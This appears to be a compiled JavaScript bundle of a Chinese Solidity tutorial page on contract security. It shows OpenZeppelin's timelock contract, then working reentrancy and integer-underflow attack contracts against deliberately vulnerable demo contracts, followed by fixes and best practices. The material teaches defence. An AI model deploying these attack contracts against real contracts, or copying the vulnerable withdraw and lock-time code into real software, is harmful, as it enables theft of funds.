(window.webpackJsonp=window.webpackJsonp||[]).push([[46],{451:function(e,n,t){"use strict";t.r(n);var a=t(2),s=Object(a.a)({},(function(){var e=this,n=e._self._c;return n("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[n("h1",{attrs:{id:"_20-合约安全"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_20-合约安全"}},[e._v("#")]),e._v(" 20.合约安全")]),e._v(" "),n("h2",{attrs:{id:"_1️⃣-时间锁合约"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_1️⃣-时间锁合约"}},[e._v("#")]),e._v(" 1️⃣ 时间锁合约")]),e._v(" "),n("h3",{attrs:{id:"说明"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#说明"}},[e._v("#")]),e._v(" 说明")]),e._v(" "),n("ul",[n("li",[e._v("对合约的一种保护机制。任何更新操作都是先进入队列。经过一段时间后，才可以真正执行。")]),e._v(" "),n("li",[e._v("DeFi 类 Dapp 都会加时间锁。")])]),e._v(" "),n("h3",{attrs:{id:"注意"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#注意"}},[e._v("#")]),e._v(" 注意")]),e._v(" "),n("ul",[n("li",[e._v("测试合约 "),n("code",[e._v("Main")])]),e._v(" "),n("li",[e._v("时间锁合约 "),n("code",[e._v("TimeLock")])]),e._v(" "),n("li",[n("code",[e._v("Main")]),e._v(" 内的函数，只能由 "),n("code",[e._v("TimeLock")]),e._v(" 调用。")]),e._v(" "),n("li",[n("code",[e._v("TimeLock")]),e._v(" 不能立即调用，需要加事件延迟。")])]),e._v(" "),n("h3",{attrs:{id:"合约代码"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#合约代码"}},[e._v("#")]),e._v(" 合约代码")]),e._v(" "),n("p",[e._v("以下代码来自 "),n("a",{attrs:{href:"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/governance/TimelockController.sol",target:"_blank",rel:"noopener noreferrer"}},[e._v("OpenZeppelin TimelockController"),n("OutboundLink")],1)]),e._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[e._v('contract TimelockController is AccessControl, IERC721Receiver, IERC1155Receiver {\n    bytes32 public constant TIMELOCK_ADMIN_ROLE = keccak256("TIMELOCK_ADMIN_ROLE");\n    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");\n    bytes32 public constant EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");\n    bytes32 public constant CANCELLER_ROLE = keccak256("CANCELLER_ROLE");\n    uint256 internal constant _DONE_TIMESTAMP = uint256(1);\n\n    mapping(bytes32 => uint256) private _timestamps;\n    uint256 private _minDelay;\n\n    /**\n     * @dev Emitted when a call is scheduled as part of operation `id`.\n     */\n    event CallScheduled(\n        bytes32 indexed id,\n        uint256 indexed index,\n        address target,\n        uint256 value,\n        bytes data,\n        bytes32 predecessor,\n        uint256 delay\n    );\n\n    /**\n     * @dev Emitted when a call is performed as part of operation `id`.\n     */\n    event CallExecuted(bytes32 indexed id, uint256 indexed index, address target, uint256 value, bytes data);\n\n    /**\n     * @dev Emitted when operation `id` is cancelled.\n     */\n    event Cancelled(bytes32 indexed id);\n\n    /**\n     * @dev Emitted when the minimum delay for future operations is modified.\n     */\n    event MinDelayChange(uint256 oldDuration, uint256 newDuration);\n\n    /**\n     * @dev Initializes the contract with the following parameters:\n     *\n     * - `minDelay`: initial minimum delay for operations\n     * - `proposers`: accounts to be granted proposer and canceller roles\n     * - `executors`: accounts to be granted executor role\n     * - `admin`: optional account to be granted admin role; disable with zero address\n     *\n     * IMPORTANT: The optional admin can aid with initial configuration of roles after deployment\n     * without being subject to delay, but this role should be subsequently renounced in favor of\n     * administration through timelocked proposals. Previous versions of this contract would assign\n     * this admin to the deployer automatically and should be renounced as well.\n     */\n    constructor(uint256 minDelay, address[] memory proposers, address[] memory executors, address admin) {\n        _setRoleAdmin(TIMELOCK_ADMIN_ROLE, TIMELOCK_ADMIN_ROLE);\n        _setRoleAdmin(PROPOSER_ROLE, TIMELOCK_ADMIN_ROLE);\n        _setRoleAdmin(EXECUTOR_ROLE, TIMELOCK_ADMIN_ROLE);\n        _setRoleAdmin(CANCELLER_ROLE, TIMELOCK_ADMIN_ROLE);\n\n        // self administration\n        _setupRole(TIMELOCK_ADMIN_ROLE, address(this));\n\n        // optional admin\n        if (admin != address(0)) {\n            _setupRole(TIMELOCK_ADMIN_ROLE, admin);\n        }\n\n        // register proposers and cancellers\n        for (uint256 i = 0; i < proposers.length; ++i) {\n            _setupRole(PROPOSER_ROLE, proposers[i]);\n            _setupRole(CANCELLER_ROLE, proposers[i]);\n        }\n\n        // register executors\n        for (uint256 i = 0; i < executors.length; ++i) {\n            _setupRole(EXECUTOR_ROLE, executors[i]);\n        }\n\n        _minDelay = minDelay;\n        emit MinDelayChange(0, minDelay);\n    }\n\n    /**\n     * @dev Modifier to make a function callable only by a certain role. In\n     * addition to checking the sender\'s role, `address(0)` \'s role is also\n     * considered. Granting a role to `address(0)` is equivalent to enabling\n     * this role for everyone.\n     */\n    modifier onlyRoleOrOpenRole(bytes32 role) {\n        if (!hasRole(role, address(0))) {\n            _checkRole(role, _msgSender());\n        }\n        _;\n    }\n\n    /**\n     * @dev Contract might receive/hold ETH as part of the maintenance process.\n     */\n    receive() external payable {}\n\n    /**\n     * @dev See {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId) public view virtual override(IERC165, AccessControl) returns (bool) {\n        return interfaceId == type(IERC1155Receiver).interfaceId || super.supportsInterface(interfaceId);\n    }\n\n    /**\n     * @dev Returns whether an id correspond to a registered operation. This\n     * includes both Pending, Ready and Done operations.\n     */\n    function isOperation(bytes32 id) public view virtual returns (bool registered) {\n        return getTimestamp(id) > 0;\n    }\n\n    /**\n     * @dev Returns whether an operation is pending or not.\n     */\n    function isOperationPending(bytes32 id) public view virtual returns (bool pending) {\n        return getTimestamp(id) > _DONE_TIMESTAMP;\n    }\n\n    /**\n     * @dev Returns whether an operation is ready or not.\n     */\n    function isOperationReady(bytes32 id) public view virtual returns (bool ready) {\n        uint256 timestamp = getTimestamp(id);\n        return timestamp > _DONE_TIMESTAMP && timestamp <= block.timestamp;\n    }\n\n    /**\n     * @dev Returns whether an operation is done or not.\n     */\n    function isOperationDone(bytes32 id) public view virtual returns (bool done) {\n        return getTimestamp(id) == _DONE_TIMESTAMP;\n    }\n\n    /**\n     * @dev Returns the timestamp at which an operation becomes ready (0 for\n     * unset operations, 1 for done operations).\n     */\n    function getTimestamp(bytes32 id) public view virtual returns (uint256 timestamp) {\n        return _timestamps[id];\n    }\n\n    /**\n     * @dev Returns the minimum delay for an operation to become valid.\n     *\n     * This value can be changed by executing an operation that calls `updateDelay`.\n     */\n    function getMinDelay() public view virtual returns (uint256 duration) {\n        return _minDelay;\n    }\n\n    /**\n     * @dev Returns the identifier of an operation containing a single\n     * transaction.\n     */\n    function hashOperation(\n        address target,\n        uint256 value,\n        bytes calldata data,\n        bytes32 predecessor,\n        bytes32 salt\n    ) public pure virtual returns (bytes32 hash) {\n        return keccak256(abi.encode(target, value, data, predecessor, salt));\n    }\n\n    /**\n     * @dev Returns the identifier of an operation containing a batch of\n     * transactions.\n     */\n    function hashOperationBatch(\n        address[] calldata targets,\n        uint256[] calldata values,\n        bytes[] calldata payloads,\n        bytes32 predecessor,\n        bytes32 salt\n    ) public pure virtual returns (bytes32 hash) {\n        return keccak256(abi.encode(targets, values, payloads, predecessor, salt));\n    }\n\n    /**\n     * @dev Schedule an operation containing a single transaction.\n     *\n     * Emits a {CallScheduled} event.\n     *\n     * Requirements:\n     *\n     * - the caller must have the \'proposer\' role.\n     */\n    function schedule(\n        address target,\n        uint256 value,\n        bytes calldata data,\n        bytes32 predecessor,\n        bytes32 salt,\n        uint256 delay\n    ) public virtual onlyRole(PROPOSER_ROLE) {\n        bytes32 id = hashOperation(target, value, data, predecessor, salt);\n        _schedule(id, delay);\n        emit CallScheduled(id, 0, target, value, data, predecessor, delay);\n    }\n\n    /**\n     * @dev Schedule an operation containing a batch of transactions.\n     *\n     * Emits one {CallScheduled} event per transaction in the batch.\n     *\n     * Requirements:\n     *\n     * - the caller must have the \'proposer\' role.\n     */\n    function scheduleBatch(\n        address[] calldata targets,\n        uint256[] calldata values,\n        bytes[] calldata payloads,\n        bytes32 predecessor,\n        bytes32 salt,\n        uint256 delay\n    ) public virtual onlyRole(PROPOSER_ROLE) {\n        require(targets.length == values.length, "TimelockController: length mismatch");\n        require(targets.length == payloads.length, "TimelockController: length mismatch");\n\n        bytes32 id = hashOperationBatch(targets, values, payloads, predecessor, salt);\n        _schedule(id, delay);\n        for (uint256 i = 0; i < targets.length; ++i) {\n            emit CallScheduled(id, i, targets[i], values[i], payloads[i], predecessor, delay);\n        }\n    }\n\n    /**\n     * @dev Schedule an operation that is to become valid after a given delay.\n     */\n    function _schedule(bytes32 id, uint256 delay) private {\n        require(!isOperation(id), "TimelockController: operation already scheduled");\n        require(delay >= getMinDelay(), "TimelockController: insufficient delay");\n        _timestamps[id] = block.timestamp + delay;\n    }\n\n    /**\n     * @dev Cancel an operation.\n     *\n     * Requirements:\n     *\n     * - the caller must have the \'canceller\' role.\n     */\n    function cancel(bytes32 id) public virtual onlyRole(CANCELLER_ROLE) {\n        require(isOperationPending(id), "TimelockController: operation cannot be cancelled");\n        delete _timestamps[id];\n\n        emit Cancelled(id);\n    }\n\n    /**\n     * @dev Execute an (ready) operation containing a single transaction.\n     *\n     * Emits a {CallExecuted} event.\n     *\n     * Requirements:\n     *\n     * - the caller must have the \'executor\' role.\n     */\n    // This function can reenter, but it doesn\'t pose a risk because _afterCall checks that the proposal is pending,\n    // thus any modifications to the operation during reentrancy should be caught.\n    // slither-disable-next-line reentrancy-eth\n    function execute(\n        address target,\n        uint256 value,\n        bytes calldata payload,\n        bytes32 predecessor,\n        bytes32 salt\n    ) public payable virtual onlyRoleOrOpenRole(EXECUTOR_ROLE) {\n        bytes32 id = hashOperation(target, value, payload, predecessor, salt);\n\n        _beforeCall(id, predecessor);\n        _execute(target, value, payload);\n        emit CallExecuted(id, 0, target, value, payload);\n        _afterCall(id);\n    }\n\n    /**\n     * @dev Execute an (ready) operation containing a batch of transactions.\n     *\n     * Emits one {CallExecuted} event per transaction in the batch.\n     *\n     * Requirements:\n     *\n     * - the caller must have the \'executor\' role.\n     */\n    function executeBatch(\n        address[] calldata targets,\n        uint256[] calldata values,\n        bytes[] calldata payloads,\n        bytes32 predecessor,\n        bytes32 salt\n    ) public payable virtual onlyRoleOrOpenRole(EXECUTOR_ROLE) {\n        require(targets.length == values.length, "TimelockController: length mismatch");\n        require(targets.length == payloads.length, "TimelockController: length mismatch");\n\n        bytes32 id = hashOperationBatch(targets, values, payloads, predecessor, salt);\n\n        _beforeCall(id, predecessor);\n        for (uint256 i = 0; i < targets.length; ++i) {\n            address target = targets[i];\n            uint256 value = values[i];\n            bytes calldata payload = payloads[i];\n            _execute(target, value, payload);\n            emit CallExecuted(id, i, target, value, payload);\n        }\n        _afterCall(id);\n    }\n\n    /**\n     * @dev Execute an operation\'s call.\n     */\n    function _execute(address target, uint256 value, bytes calldata data) internal virtual {\n        (bool success, ) = target.call{value: value}(data);\n        require(success, "TimelockController: underlying transaction reverted");\n    }\n\n    /**\n     * @dev Checks before execution of an operation\'s calls.\n     */\n    function _beforeCall(bytes32 id, bytes32 predecessor) private view {\n        require(isOperationReady(id), "TimelockController: operation is not ready");\n        require(predecessor == bytes32(0) || isOperationDone(predecessor), "TimelockController: missing dependency");\n    }\n\n    /**\n     * @dev Checks after execution of an operation\'s calls.\n     */\n    function _afterCall(bytes32 id) private {\n        require(isOperationReady(id), "TimelockController: operation is not ready");\n        _timestamps[id] = _DONE_TIMESTAMP;\n    }\n\n    /**\n     * @dev Changes the minimum timelock duration for future operations.\n     *\n     * Emits a {MinDelayChange} event.\n     *\n     * Requirements:\n     *\n     * - the caller must be the timelock itself. This can only be achieved by scheduling and later executing\n     * an operation where the timelock is the target and the data is the ABI-encoded call to this function.\n     */\n    function updateDelay(uint256 newDelay) external virtual {\n        require(msg.sender == address(this), "TimelockController: caller must be timelock");\n        emit MinDelayChange(_minDelay, newDelay);\n        _minDelay = newDelay;\n    }\n\n    /**\n     * @dev See {IERC721Receiver-onERC721Received}.\n     */\n    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n\n    /**\n     * @dev See {IERC1155Receiver-onERC1155Received}.\n     */\n    function onERC1155Received(\n        address,\n        address,\n        uint256,\n        uint256,\n        bytes memory\n    ) public virtual override returns (bytes4) {\n        return this.onERC1155Received.selector;\n    }\n\n    /**\n     * @dev See {IERC1155Receiver-onERC1155BatchReceived}.\n     */\n    function onERC1155BatchReceived(\n        address,\n        address,\n        uint256[] memory,\n        uint256[] memory,\n        bytes memory\n    ) public virtual override returns (bytes4) {\n        return this.onERC1155BatchReceived.selector;\n    }\n}\n')])])]),n("h2",{attrs:{id:"_2️⃣-重入攻击"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_2️⃣-重入攻击"}},[e._v("#")]),e._v(" 2️⃣ 重入攻击")]),e._v(" "),n("h3",{attrs:{id:"什么是重入攻击"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#什么是重入攻击"}},[e._v("#")]),e._v(" 什么是重入攻击？")]),e._v(" "),n("p",[e._v("合约取款方法被多次触发，导致发送金额不符合预期流程。")]),e._v(" "),n("p",[n("img",{attrs:{src:"/_static/101/01.jpg",alt:""}})]),e._v(" "),n("h3",{attrs:{id:"攻击演示"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#攻击演示"}},[e._v("#")]),e._v(" 攻击演示")]),e._v(" "),n("p",[n("strong",[e._v("合约")])]),e._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[e._v('// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Demo {\n    mapping(address => uint256) public balances;\n\n    //  存款\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    // 取款\n    function withdraw(uint256 _amount) public {\n        require(balances[msg.sender] >= _amount, "Insufficient balance");\n        (bool success, ) = msg.sender.call{value: _amount}("");\n        require(success, "Failed to send");\n        balances[msg.sender] -= _amount;\n    }\n\n    /*\n     * ========================================\n     * Helper\n     * ========================================\n     */\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack {\n    Demo public demo;\n\n    constructor(address _demoAddress) public {\n        demo = Demo(_demoAddress);\n    }\n\n    fallback() external payable {\n        if (address(demo).balance >= 1 ether) {\n            demo.withdraw(1 ether);\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether, "need 1 ether");\n        demo.deposit{value: 1 ether}();\n        demo.withdraw(1 ether);\n    }\n\n    /*\n     * ========================================\n     * Helper\n     * ========================================\n     */\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n')])])]),n("p",[n("strong",[e._v("合约测试")])]),e._v(" "),n("ul",[n("li",[e._v("address1 部署 "),n("code",[e._v("Demo")])]),e._v(" "),n("li",[e._v("address1 调用 "),n("code",[e._v("Demo.deposit")]),e._v(" 存入 10 ETH")]),e._v(" "),n("li",[e._v("address1 调用 "),n("code",[e._v("Demo.getBalance")]),e._v(" 查看余额")]),e._v(" "),n("li",[e._v("address2 部署攻击合约 "),n("code",[e._v("Attack")]),e._v(";\n"),n("ul",[n("li",[e._v("参数是 Demo 合约地址")])])]),e._v(" "),n("li",[e._v("address2 调用 "),n("code",[e._v("Attack.attack")]),e._v(" ，并且发送 1Eth，发起攻击")]),e._v(" "),n("li",[e._v("查看 "),n("code",[e._v("Attack.getBalance")]),e._v(" 余额")]),e._v(" "),n("li",[e._v("查看 "),n("code",[e._v("Demo.getBalance")]),e._v(" 余额")])]),e._v(" "),n("h3",{attrs:{id:"如何避免重入攻击"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#如何避免重入攻击"}},[e._v("#")]),e._v(" 如何避免重入攻击？")]),e._v(" "),n("ol",[n("li",[n("p",[e._v("先赋值再进行转账")]),e._v(" "),n("p",[e._v("修改前：")]),e._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[e._v('(bool success, ) = msg.sender.call{value: _amount}("");\nrequire(success, "Failed to send");\nbalances[msg.sender] -= _amount;\n')])])]),n("p",[e._v("修改后：")]),e._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[e._v(' balances[msg.sender] -= _amount;\n(bool success, ) = msg.sender.call{value: _amount}("");\nrequire(success, "Failed to send");\n')])])]),n("p",[e._v("修改后，再次跳用，因为数据已经被修改了，所以报错 "),n("code",[e._v('"Failed to send".')])])]),e._v(" "),n("li",[n("p",[e._v("使用新版本的 Solidity 编写，")]),e._v(" "),n("ol",[n("li",[e._v("比如上面使用的是"),n("code",[e._v("^0.6.10")]),e._v("，换成"),n("code",[e._v("^0.8.16")]),e._v(" 就没有这个问题。")])])]),e._v(" "),n("li",[n("p",[e._v("使用状态变量和"),n("code",[e._v("modifier")]),e._v("配合做防重入锁")]),e._v(" "),n("ol",[n("li",[e._v("比如在 "),n("code",[e._v("withdraw")]),e._v(" 上增加如下修改器。")])]),e._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[e._v(' bool internal locked;\n\n modifier noReentrant() {\n     require(!locked, "no reentrant");\n     locked = true;\n     _;\n     locked = false;\n }\n')])])])])]),e._v(" "),n("h2",{attrs:{id:"_3️⃣-数学溢出攻击"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3️⃣-数学溢出攻击"}},[e._v("#")]),e._v(" 3️⃣ 数学溢出攻击")]),e._v(" "),n("ul",[n("li",[n("code",[e._v("uint")]),e._v(" 相当于 "),n("code",[e._v("uint256")]),e._v(" "),n("ul",[n("li",[e._v("范围: "),n("code",[e._v("0 <= x <= 2**256 -1")])]),e._v(" "),n("li",[e._v("上溢("),n("strong",[e._v("overflow")]),e._v("): 超出 "),n("code",[e._v("2**256 -1")]),e._v(" 后，变成 0")]),e._v(" "),n("li",[e._v("下溢("),n("strong",[e._v("underflow")]),e._v("): 低于 "),n("code",[e._v("0")]),e._v(" 后，变成 "),n("code",[e._v("2**256 -1")])])])])]),e._v(" "),n("h3",{attrs:{id:"合约演示"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#合约演示"}},[e._v("#")]),e._v(" 合约演示")]),e._v(" "),n("p",[e._v("下面是一个锁定合约，可以通过攻击，忽略锁定期直接取钱，无需等待。")]),e._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[e._v('// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Demo {\n    mapping(address => uint256) public balances;\n    mapping(address => uint256) public lockTime;\n\n    // 存\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    // 取\n    function withdraw() external {\n        require(balances[msg.sender] > 0, "Insufficient balance");\n        require(lockTime[msg.sender] < block.timestamp, "lock-in period");\n\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n        (bool success, ) = msg.sender.call{value: amount}("");\n        require(success, "Send failed");\n    }\n\n    // 续时间\n    function increaseLockTime(uint256 time) public {\n        lockTime[msg.sender] += time;\n    }\n}\n\ncontract Attack {\n    Demo public demo;\n\n    constructor(address _demoAddress) public {\n        demo = Demo(_demoAddress);\n    }\n\n    fallback() external payable {}\n\n    function attack() external payable {\n        demo.deposit{value: msg.value}();\n        // uint(-1) => uint(2**256-1)\n        // currentTime = demo.balances(msg.sender)\n        // 增加的时间 x  = 2**256 - currentTime\n        // 增加的时间 x  = - currentTime\n        demo.increaseLockTime(uint256(-demo.lockTime(address(this))));\n        demo.withdraw();\n    }\n\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n')])])]),n("p",[n("strong",[e._v("合约测试")])]),e._v(" "),n("ul",[n("li",[e._v("部署 Demo")]),e._v(" "),n("li",[e._v("部署 Attack ，使用 Demo 地址。")]),e._v(" "),n("li",[e._v("使用 "),n("code",[e._v("Attack.attack")])]),e._v(" "),n("li",[e._v("调用 "),n("code",[e._v("Attack.getBalance")]),e._v(" 发现钱已经取回来了。")])]),e._v(" "),n("h3",{attrs:{id:"如何避免溢出攻击"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#如何避免溢出攻击"}},[e._v("#")]),e._v(" 如何避免溢出攻击？")]),e._v(" "),n("ol",[n("li",[n("p",[e._v("使用高版本的 Solidity，比如 "),n("code",[e._v("^0.8.16;")])])]),e._v(" "),n("li",[n("p",[e._v("引用 "),n("code",[e._v("OpenZeppelin")]),e._v("，使用其中的 "),n("code",[e._v("SafeMath")]),e._v(" 进行操作")]),e._v(" "),n("ol",[n("li",[e._v("此时再进行攻击，会收到 SafeMath 内的报错 "),n("code",[e._v('"SafeMath: addition overflow".')])])]),e._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[e._v('import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol";\nfunction increaseLockTime(uint256 time) public {\n    // lockTime[msg.sender] += time;\n    lockTime[msg.sender] = lockTime[msg.sender].add(time); // add 是 SafeMath 内的方法\n}\n')])])])])]),e._v(" "),n("h2",{attrs:{id:"🆗-推荐做法"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#🆗-推荐做法"}},[e._v("#")]),e._v(" 🆗 推荐做法")]),e._v(" "),n("p",[e._v("以下内容来自 Solidity 合约文档")]),e._v(" "),n("h3",{attrs:{id:"认真对待警告"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#认真对待警告"}},[e._v("#")]),e._v(" 认真对待警告")]),e._v(" "),n("p",[e._v("如果编译器警告您一些事情，您应该改变它。\n即使您不认为这个特定的警告有安全问题，但也可能在它下面埋藏着另一个问题。\n我们发出的任何编译器警告都可以通过对代码的轻微修改来消除。")]),e._v(" "),n("p",[e._v("始终使用最新版本的编译器，以获知所有最近引入的警告。")]),e._v(" "),n("p",[e._v("编译器发出的 "),n("code",[e._v("info")]),e._v(" 类型的信息并不危险，只是代表编译器认为可能对用户有用的额外建议和可选信息。")]),e._v(" "),n("h3",{attrs:{id:"限制以太币的数量"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#限制以太币的数量"}},[e._v("#")]),e._v(" 限制以太币的数量")]),e._v(" "),n("p",[e._v("限制智能合约中可存储的以太币（或其他代币）的数量。\n如果您的源代码，编译器或平台有错误，这些资金可能会丢失。\n如果您想限制您的损失，就限制以太币的数量。")]),e._v(" "),n("h3",{attrs:{id:"保持合约简练且模块化"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#保持合约简练且模块化"}},[e._v("#")]),e._v(" 保持合约简练且模块化")]),e._v(" "),n("p",[e._v("保持您的合约短小而容易理解。把不相关的功能单独放在其他合约中或放在库中。\n关于源代码质量的一般建议当然也适用：限制局部变量的数量和函数的长度，等等。\n给您的函数添加注释，这样别人就可以看到您的意图是什么，\n并判断代码是否按照正确的意图实现。")]),e._v(" "),n("h3",{attrs:{id:"使用-检查-生效-交互-checks-effects-interactions-模式"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#使用-检查-生效-交互-checks-effects-interactions-模式"}},[e._v("#")]),e._v(" 使用“检查-生效-交互”（Checks-Effects-Interactions）模式")]),e._v(" "),n("p",[e._v("大多数函数会首先进行一些检查（谁调用了这个函数，参数是否在范围内，\n他们是否发送了足够的以太，这个人是否有代币，等等）。这些检查应该首先完成。")]),e._v(" "),n("p",[e._v("第二步，如果所有的检查都通过了，就应该对当前合约的状态变量进行影响。\n与其他合约的交互应该是任何函数的最后一步。")]),e._v(" "),n("p",[e._v("早期的合约延迟了一些效果，等待外部函数调用在非错误状态下返回。\n这往往是一个严重的错误，因为上面解释了重入问题。")]),e._v(" "),n("p",[e._v("请注意，对已知合约的调用也可能反过来导致对未知合约的调用，因此，最好总是应用这种模式。")]),e._v(" "),n("h3",{attrs:{id:"包含故障-安全-fail-safe-模式"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#包含故障-安全-fail-safe-模式"}},[e._v("#")]),e._v(" 包含故障-安全（Fail-Safe）模式")]),e._v(" "),n("p",[e._v("尽管将系统完全去中心化可以省去许多中间环节，但包含某种故障-安全模式仍然是好的做法，\n尤其是对于新的代码来说：")]),e._v(" "),n("p",[e._v("您可以在您的智能合约中添加一个功能，执行一些自我检查，如 “是否有任何以太币泄漏？”，\n“代币的总和是否等于合约的余额？” 或类似的事情。\n请记住，您不能为此使用太多的 gas，所以可能需要通过链外计算的帮助。")]),e._v(" "),n("p",[e._v("如果自我检查失败，合约会自动切换到某种 “故障安全” 模式，\n例如，禁用大部分功能，将控制权移交给一个固定的，可信赖的第三方，\n或者只是将合约转换为一个简单的 “退回我的钱” 的合约。")]),e._v(" "),n("h3",{attrs:{id:"请求同行评审"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#请求同行评审"}},[e._v("#")]),e._v(" 请求同行评审")]),e._v(" "),n("p",[e._v("检查一段代码的人越多，发现的问题就越多。\n要求其他人审查您的代码也有助于作为交叉检查，\n找出您的代码是否容易理解 - 这是好的智能合约的一个非常重要的标准。")]),e._v(" "),n("h2",{attrs:{id:"🆗-扩展阅读"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#🆗-扩展阅读"}},[e._v("#")]),e._v(" 🆗 扩展阅读")]),e._v(" "),n("p",[e._v("下面是相关的官方中文文档，推荐阅读。")]),e._v(" "),n("ul",[n("li",[e._v("安全考虑\n"),n("ul",[n("li",[e._v("https://docs.soliditylang.org/zh/latest/security-considerations.html")])])]),e._v(" "),n("li",[e._v("SMTChecker 和形式化验证\n"),n("ul",[n("li",[e._v("https://docs.soliditylang.org/zh/latest/smtchecker.html")])])])])])}),[],!1,null,null,null);n.default=s.exports}}]);